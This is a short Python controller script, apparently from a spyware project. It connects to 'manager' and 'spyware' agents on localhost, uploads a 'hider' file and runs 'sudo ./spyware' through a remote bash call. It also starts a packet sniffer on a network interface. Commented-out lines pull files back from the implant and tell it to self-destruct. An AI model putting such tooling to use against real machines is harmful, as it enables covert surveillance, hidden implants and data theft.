from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep
import structParams
import contParams

HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def clean():
    #spyAgent = Agent(HOST, PORT_SPYWARE)
    agent = Agent(HOST, PORT_MANEGER)
    agent.suicide()
    #spyAgent.suicide()


def setUpManager(targetHiderPath, sentPath):
    managerAgent = Agent(HOST, PORT_MANEGER)
    managerAgent.write_file(targetHiderPath, sentPath)
    print(managerAgent.hider_setup(sentPath))
    print(managerAgent.run_bash("sudo ./spyware"))
    return managerAgent

def main():

    targetHiderPath = "./hider"
    sentPath = "./sentHider.cyber"

    #setUpManager(targetHiderPath, sentPath)
    spyAgent = Agent(HOST, PORT_SPYWARE)
    params = contParams.ContParams(contParams.SnifferType, contParams.Params(contParams.SniffParams(20, b"ens33")))
    print(spyAgent.runContraption(params, 10))

    #print(managerAgent.retrieve_file("fishTest.txt"))

    #spyAgent = Agent(HOST, PORT_SPYWARE)
    #print(spyAgent.retrieve_file("fishfish.txt"))

    #print(spyAgent.hider_setup(targetHiderPath))


if __name__ == "__main__":
    main()
    #clean()
